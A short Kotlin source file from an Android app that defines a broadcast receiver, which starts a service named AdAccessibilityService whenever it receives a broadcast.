package com.esport.stocksmo

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class RestartServiceReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent?) {
        val serviceIntent = Intent(context, AdAccessibilityService::class.java)
        context.startService(serviceIntent)
    }
}
